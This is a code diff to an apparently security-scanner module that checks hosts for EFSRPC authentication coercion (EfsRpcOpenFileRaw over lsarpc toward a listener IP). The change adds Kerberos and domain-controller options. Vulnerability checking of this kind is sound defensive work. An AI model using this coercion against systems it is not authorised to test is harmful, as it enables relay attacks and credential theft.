@@ -31,12 +31,13 @@ class Module:
         user = creds['username'] if 'username' in creds else None
         password = creds['password'] if 'password' in creds else None
         ntlm_hash = creds['hash'] if 'hash' in creds else ''
+        do_kerberos = creds['kerberos'] if 'kerberos' in creds else False
+        dc_ip = creds['dc_ip'] if 'dc_ip' in creds else None
 
-        check(target['hostname'], target['port'], listener_ip, domain, user, password, ntlm_hash, timeout)
+        check(target['hostname'], target['port'], listener_ip, domain, user, password, ntlm_hash, do_kerberos, dc_ip, timeout)
 
-def check(ip, port, listener_ip, domain, username, password, ntlm_hash, timeout):
+def check(ip, port, listener_ip, domain, username, password, ntlm_hash, do_kerberos, dc_ip, timeout):
 
-    do_kerberos = False
     pipe = 'lsarpc'
     if len(ntlm_hash) != 0:
         lmhash, nthash = ntlm_hash.split(':')
@@ -45,7 +46,7 @@ def check(ip, port, listener_ip, domain, username, password, ntlm_hash, timeout)
         nthash = ''
 
     plop = CoerceAuth()
-    dce = plop.connect(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, target=ip, pipe=pipe, doKerberos=do_kerberos, dcHost=None, targetIp=ip)
+    dce = plop.connect(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, target=ip, pipe=pipe, doKerberos=do_kerberos, dcHost=dc_ip, targetIp=ip)
 
     if dce != None:
         vulnerable = plop.EfsRpcOpenFileRaw(dce, listener_ip)
